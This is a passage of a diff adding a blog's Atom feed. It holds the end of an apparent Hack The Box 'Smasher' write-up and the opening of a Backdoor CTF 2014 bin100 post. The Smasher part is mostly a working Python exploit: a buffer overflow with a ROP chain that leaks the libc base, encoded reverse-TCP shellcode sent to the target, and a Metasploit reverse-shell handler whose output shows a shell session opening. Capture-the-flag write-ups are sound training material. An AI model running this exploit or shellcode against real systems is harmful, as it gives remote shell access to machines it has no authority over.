+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\xe2\x3c\x9d\x64\xa6\xf8\x1b\xfc\x9f\x8d\x38\x8d\xa3&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\xb0\x9e\x3c\xe7\x62\xc7&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;That will be a shellcode, and let&#x27;s put together rest of our exploit.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;httplib
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;struct
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;socket
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;telnetlib
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;urllib
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;url = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;10.10.10.89:1111&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;lurl = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;localhost:9999&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;execute_payload&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;payload&lt;&#x2F;span&gt;&lt;span&gt;):
+&lt;&#x2F;span&gt;&lt;span&gt;    s = socket.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;socket&lt;&#x2F;span&gt;&lt;span&gt;(socket.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;AF_INET&lt;&#x2F;span&gt;&lt;span&gt;, socket.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SOCK_STREAM&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;    s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;connect&lt;&#x2F;span&gt;&lt;span&gt;((&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;10.10.10.89&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1111&lt;&#x2F;span&gt;&lt;span&gt;))
+&lt;&#x2F;span&gt;&lt;span&gt;    s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;GET &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;{}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; HTTP&#x2F;1.1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;format&lt;&#x2F;span&gt;&lt;span&gt;(urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote_plus&lt;&#x2F;span&gt;&lt;span&gt;(payload)))
+&lt;&#x2F;span&gt;&lt;span&gt;    response = s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4096&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;    s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;response
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;payload&lt;&#x2F;span&gt;&lt;span&gt;):
+&lt;&#x2F;span&gt;&lt;span&gt;    s = socket.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;socket&lt;&#x2F;span&gt;&lt;span&gt;(socket.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;AF_INET&lt;&#x2F;span&gt;&lt;span&gt;, socket.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SOCK_STREAM&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#s.connect((&amp;quot;localhost&amp;quot;, 9999))
+&lt;&#x2F;span&gt;&lt;span&gt;    s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;connect&lt;&#x2F;span&gt;&lt;span&gt;((&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;10.10.10.89&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1111&lt;&#x2F;span&gt;&lt;span&gt;))
+&lt;&#x2F;span&gt;&lt;span&gt;    s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;GET &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;{}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; HTTP&#x2F;1.1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;format&lt;&#x2F;span&gt;&lt;span&gt;(urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote_plus&lt;&#x2F;span&gt;&lt;span&gt;(payload)))
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# get a shell
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# padding to RIP
+&lt;&#x2F;span&gt;&lt;span&gt;padding = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;A&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;568
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# got and plt
+&lt;&#x2F;span&gt;&lt;span&gt;read_got = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x603088 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# read()@GOT address
+&lt;&#x2F;span&gt;&lt;span&gt;write_plt = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400c50 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# write()@PLT address
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# offsets
+&lt;&#x2F;span&gt;&lt;span&gt;read_off = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0f7250 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# read() offset from libc base
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# gadgets
+&lt;&#x2F;span&gt;&lt;span&gt;poprdiret = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x4011dd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# pop rdi; ret
+&lt;&#x2F;span&gt;&lt;span&gt;poprsiret = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x4011db &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# pop rsi; pop r15; ret
+&lt;&#x2F;span&gt;&lt;span&gt;push_rsp  = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x023ad1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# push rsp; ret
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#### 1 - leak the libc base
+&lt;&#x2F;span&gt;&lt;span&gt;buf = &amp;quot;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += padding
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, poprdiret)
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x4&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, poprsiret)
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, read_got)
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0xF&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, write_plt)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;response = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;execute_payload&lt;&#x2F;span&gt;&lt;span&gt;(buf).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;File not found&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]           
+&lt;&#x2F;span&gt;&lt;span&gt;read_addr = struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;unpack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, response[:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;])[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;read() is at&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(read_addr)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;libc_addr = read_addr - read_off
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;libc base is at&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(libc_addr)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#### 2 - Execute shellcode from stack
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;gadget = libc_addr + push_rsp
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;buf = &amp;quot;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += padding
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,  gadget)
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d\x05&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\xef\xff\xff\xff\x48\xbb\xc7\xa4\xa1\x8a\x02\xe7\x6d&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\x1b\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\x8f\x95\x5e\xe0\x0b\xbf\xf4\xad\xd7\xec\x28\x5c\x4f&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\xd6\xa4\x71\xe5\xe5\xfb\x38\x05\xe8\x68\x53\x42\x64&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\xd9\xd8\x68\xed\x2c\x42\x91\xf4\xcb\xa3\x5a\x7e\x07&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\x19\x98\xce\xa0\xd4\x0d\xe2\x25\x9e\x07\xdc\x9a\xc2&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\x95\xaf\xd4\x19\xc7\xb5\xfd\x80\x08\xea\x83\x4a\x8f&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\x2d\x47\xe0\x12\xbd\x07\x31\x9f\xab\xa4\xd3\x4a\x62&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\xad\x62\xe2\xed\x5e\x43\x76\xff\x3a\x71\xe4\xfc\xcb&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\x8a\x68\xe2\x25\x92\x20\xec\x90\x7c\x0d\xe2\x34\x42&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\x98\xec\x24\x4a\x7b\x20\x07\x27\x9f\xce\xa0\xd5\x0d&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\xe2\x33\x41\xc8\xa1\xe9\x0f\xc2\x9f\x82\xe4\x21\xa4&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\xa1\x8a\x02\xe7\x6d\x1b&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Z&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; * (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1024 &lt;&#x2F;span&gt;&lt;span&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(buf))
+&lt;&#x2F;span&gt;&lt;span&gt;response = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;(buf)     
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Before running, remmember to start handler.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;msf &lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; use multi&#x2F;handler
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;msf&lt;&#x2F;span&gt;&lt;span&gt; exploit(multi&#x2F;handler) &amp;gt; set &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;payload&lt;&#x2F;span&gt;&lt;span&gt; linux&#x2F;x64&#x2F;shell&#x2F;reverse_tcp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;payload&lt;&#x2F;span&gt;&lt;span&gt; =&amp;gt; linux&#x2F;x64&#x2F;shell&#x2F;reverse_tcp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;msf&lt;&#x2F;span&gt;&lt;span&gt; exploit(multi&#x2F;handler) &amp;gt; set &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;LHOST&lt;&#x2F;span&gt;&lt;span&gt; 10.10.13.238
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;LHOST&lt;&#x2F;span&gt;&lt;span&gt; =&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;.10.13.238
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;msf&lt;&#x2F;span&gt;&lt;span&gt; exploit(multi&#x2F;handler) &amp;gt; run
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[*]&lt;&#x2F;span&gt;&lt;span&gt; Started reverse TCP handler on 10.10.13.238:4444 
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And run exploit!&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[badarg:~&#x2F;ctf&#x2F;hackthebox&#x2F;box&#x2F;Smasher]$&lt;&#x2F;span&gt;&lt;span&gt; python smasher_reverse_tcp.py 
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;() is at 0x7fd2fce03250
+&lt;&#x2F;span&gt;&lt;span&gt;	libc base is at 0x7fd2fcd0c000
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;If you check your multi handler, you will see new session&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[*]&lt;&#x2F;span&gt;&lt;span&gt; Sending stage (38 bytes) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span&gt; 10.10.10.89
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[*]&lt;&#x2F;span&gt;&lt;span&gt; Command shell session 1 opened (10.10.13.238:4444 -&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;.10.10.89:36424) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;at&lt;&#x2F;span&gt;&lt;span&gt; 2018-10-01 18:07:20 +0200
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;smasher&#x2F;smasher_pwned.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;That&#x27;s it. Now tha you have a shell it&#x27;s time to move onto a second stage, which is fighting this guy&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ps&lt;&#x2F;span&gt;&lt;span&gt; aux | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;grep&lt;&#x2F;span&gt;&lt;span&gt; crackme.py
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;smasher&lt;&#x2F;span&gt;&lt;span&gt;    714  0.0  0.1  24364  1784 ?        S    16:52   0:00 socat TCP-LISTEN:1337,reuseaddr,fork,bind=127.0.0.1 EXEC:&#x2F;usr&#x2F;bin&#x2F;python &#x2F;home&#x2F;smasher&#x2F;crackme.py
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Backdoor CTF 2014 - Bin100</title>
+        <published>2014-03-24T00:00:00+00:00</published>
+        <updated>2014-03-24T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              spiperac
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://spiperac.dev/posts/2014-3-24-backdoor-2014-bin100/"/>
+        <id>https://spiperac.dev/posts/2014-3-24-backdoor-2014-bin100/</id>
+        
+        <content type="html" xml:base="https://spiperac.dev/posts/2014-3-24-backdoor-2014-bin100/">&lt;h1 id=&quot;analysis-of-bin100-elf64-executable&quot;&gt;Analysis of &lt;code&gt;bin100&lt;&#x2F;code&gt; ELF64 Executable&lt;&#x2F;h1&gt;
+&lt;p&gt;We received a file named &lt;code&gt;bin100&lt;&#x2F;code&gt;, which is an ELF64 executable.&lt;&#x2F;p&gt;
+&lt;p&gt;For this challenge, I decided to experiment a bit, and I was lucky. :)&lt;&#x2F;p&gt;
+&lt;p&gt;When I started, the program expected a password as an argument:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;wiremage@oxyz ~&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;c&#x2F;b&#x2F;bin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; .&#x2F;bin100
